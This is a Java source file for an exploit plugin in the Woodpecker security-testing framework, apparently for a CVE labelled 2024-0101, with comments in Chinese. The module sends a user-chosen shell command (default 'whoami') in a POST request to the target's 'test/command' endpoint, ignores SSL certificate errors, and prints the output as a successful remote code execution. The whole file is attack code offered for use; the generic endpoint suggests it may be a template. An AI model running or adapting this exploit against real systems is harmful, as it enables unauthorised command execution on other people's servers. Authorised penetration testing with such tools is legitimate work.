package me.gv7.woodpecker.plugin.vuln.CVE_2024_0101;

import me.gv7.woodpecker.plugin.*;
import me.gv7.woodpecker.plugin.utils.WPSettings;
import me.gv7.woodpecker.requests.RawResponse;
import me.gv7.woodpecker.requests.Requests;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * {@code Exploit}模块是woodpecker中漏洞的利用组件
 *
 * <p>一个利用组件应尽量只面向一种利用方式，如果某个漏洞具有多种利用方式，则应对应开发多个{@code Exploit}模块。
 */
public class RCEExploit implements IExploit {
    private IPluginHelper helper;

    public RCEExploit(IPluginHelper helper) {
        this.helper = helper;
    }

    /**
     * 设置显示在Exploit标签页标题上的利用名称
     *
     * @return 标签页标题上的利用名称
     */
    @Override
    public String getExploitTabCaption() {
        return "RCE";
    }

    /**
     * 设置利用的一些必要的参数，如果不需要参数则直接返回 <u>null</u> 即可
     *
     * @return 返回利用所需的参数列表
     */
    @Override
    public IArgsUsageBinder getExploitCustomArgs() {
        IArgsUsageBinder argsUsageBinder = helper.createArgsUsageBinder();
        List<IArg> args = new ArrayList<>();
        final IArg command = helper.createArg();
        command.setName("command");
        command.setRequired(true);
        command.setDefaultValue("whoami");
        args.add(command);
        argsUsageBinder.setArgsList(args);
        return argsUsageBinder;
    }

    /**
     * 发起漏洞利用的入口
     *
     * @param target 攻击目标
     * @param map    用户设置的利用参数
     * @param output 打印利用日志与利用结果
     * @throws Throwable
     */
    @Override
    public void doExploit(ITarget target, Map<String, Object> map, IResultOutput output) throws Throwable {
        WPSettings settings = new WPSettings(map);
        String addr = target.getAddress();
        addr += addr.endsWith("/") ? "" : "/"; // 在url后补全/字符
        HashMap<String, String> postBody = new HashMap<>();
        postBody.put("command", settings.getString("command"));
        output.startPrintln("发送EXP...");
        RawResponse response = Requests.
                post(addr + "test/command").
                verify(false). // 忽略目标的SSL证书错误
                body(postBody).// 设置POST请求的Body
                send();        // 发送EXP
        if (response.statusCode() == 200) {
            output.successPrintln("利用成功");
            output.successPrintln(response.readToText());
        } else {
            output.errorPrintln("利用失败");
        }
    }
}